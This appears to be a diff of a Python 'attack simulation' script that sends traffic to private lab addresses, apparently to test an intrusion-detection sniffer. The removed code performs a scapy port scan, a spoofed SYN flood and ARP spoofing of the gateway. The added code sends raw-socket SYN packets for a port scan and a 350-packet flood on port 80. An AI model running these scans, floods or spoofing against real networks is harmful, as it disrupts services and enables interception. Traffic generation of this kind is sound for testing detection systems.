@@ -1,75 +1,46 @@
-import multiprocessing
-import time
-import subprocess
 import sys
-from scapy.all import IP, TCP, Ether, ARP, sendp
+import time
+import socket
+import random
 
-TARGET_IP = "10.5.0.10"
-GATEWAY_IP = "10.5.0.1"
-BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
+TARGET_IP = sys.argv[2] if len(sys.argv) > 2 else "10.5.0.2"
 
-def get_active_bridge():
-    if len(sys.argv) > 1 and sys.argv[1].startswith("br-"):
-        return sys.argv[1]
-    try:
-        cmd = "docker network inspect lab_net -f '{{.Id}}' 2>/dev/null | cut -c1-12"
-        bridge_id = subprocess.check_output(cmd, shell=True).decode().strip()
-        if bridge_id:
-            return f"br-{bridge_id}"
-    except Exception:
-        pass
-    return "br-3b14d142cadc"
+print(f"[*] Starting Multi-Vector Attack Simulation against [{TARGET_IP}]...")
 
-INTERFACE = get_active_bridge()
-
-# --- Attack 1: PortScan Worker (Source IP: 10.5.0.50) ---
-def run_portscan():
-    print(f"🚀 [THREAD 1] Launching PortScan Probing (10.5.0.50 -> {TARGET_IP})...")
-    src_ip = "10.5.0.50"
-    for port in range(20, 60):
-        pkt = Ether(dst=BROADCAST_MAC)/IP(src=src_ip, dst=TARGET_IP)/TCP(dport=port, flags="S")
-        sendp(pkt, iface=INTERFACE, verbose=0)
-        time.sleep(0.01)
-    print("✅ [THREAD 1] PortScan Finished.")
-
-# --- Attack 2: DoS / SYN Flood Worker (Source IP: 10.5.0.99) ---
-def run_syn_flood():
-    print(f"🚀 [THREAD 2] Launching DoS / SYN Flood (10.5.0.99 -> {TARGET_IP})...")
-    src_ip = "10.5.0.99"
-    pkt = Ether(dst=BROADCAST_MAC)/IP(src=src_ip, dst=TARGET_IP)/TCP(dport=80, flags="S")
-    for _ in range(800):
-        sendp(pkt, iface=INTERFACE, verbose=0)
-    print("✅ [THREAD 2] DoS / SYN Flood Finished.")
-
-# --- Attack 3: ARP Spoofing Worker (Source IP: 10.5.0.1) ---
-def run_arp_spoof():
-    print(f"🚀 [THREAD 3] Launching ARP Spoofing (10.5.0.1 -> {TARGET_IP})...")
-    arp_pkt = Ether(dst=BROADCAST_MAC)/ARP(
-        op=2,
-        psrc=GATEWAY_IP,
-        hwsrc="aa:bb:cc:dd:ee:ff",
-        pdst=TARGET_IP
+def create_syn_packet(src_port, dst_port):
+    tcp_header = (
+        src_port.to_bytes(2, 'big') +        # Source Port
+        dst_port.to_bytes(2, 'big') +        # Destination Port
+        (0).to_bytes(4, 'big') +             # Seq Number
+        (0).to_bytes(4, 'big') +             # Ack Number
+        (0x5002).to_bytes(2, 'big') +        # Header Length & SYN Flag
+        (64240).to_bytes(2, 'big') +         # Window
+        (0).to_bytes(2, 'big') +             # Checksum
+        (0).to_bytes(2, 'big')              # Urgent Pointer
     )
-    for _ in range(80):
-        sendp(arp_pkt, iface=INTERFACE, verbose=0)
-        time.sleep(0.02)
-    print("✅ [THREAD 3] ARP Spoofing Finished.")
+    return tcp_header
 
-if __name__ == "__main__":
-    print("=" * 65)
-    print(f"🔥 LAUNCHING MULTI-VECTOR ATTACK SIMULATION ON [{INTERFACE}] 🔥")
-    print("=" * 65)
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 
-    p1 = multiprocessing.Process(target=run_portscan)
-    p2 = multiprocessing.Process(target=run_syn_flood)
-    p3 = multiprocessing.Process(target=run_arp_spoof)
+# ==================== 1. PORTSCAN ATTACK ====================
+print("\n[!] [1/2] Firing PortScan Attack (Multiple Unique Ports)...")
+for port in range(1, 40):
+    packet = create_syn_packet(src_port=54321, dst_port=port)
+    s.sendto(packet, (TARGET_IP, 0))
+    time.sleep(0.01)
 
-    p1.start()
-    p2.start()
-    p3.start()
+print("[+] PortScan Complete! (40 ports probed)")
 
-    p1.join()
-    p2.join()
-    p3.join()
+# CRITICAL FIX: 6 Second Sleep to allow 5s Sniffer Window to reset cleanly
+print("\n[*] Waiting 6 seconds for Sniffer Evaluation Window to reset...")
+time.sleep(6)
 
-    print("\n[+] All simultaneous attack vectors executed successfully.")
+# ==================== 2. DoS SYN FLOOD ATTACK ====================
+print("\n[!] [2/2] Firing DoS SYN Flood Attack (Single Target Port 80)...")
+for _ in range(350):
+    rand_sport = random.randint(1024, 65535)
+    packet = create_syn_packet(src_port=rand_sport, dst_port=80) # TARGET PORT 80 ONLY
+    s.sendto(packet, (TARGET_IP, 0))
+
+print("[+] DoS SYN Flood Complete! (350 SYN packets burst on port 80)")
+print("\n[*] Check Sniffer Terminal for distinct PortScan and DoS_SYN detections!")
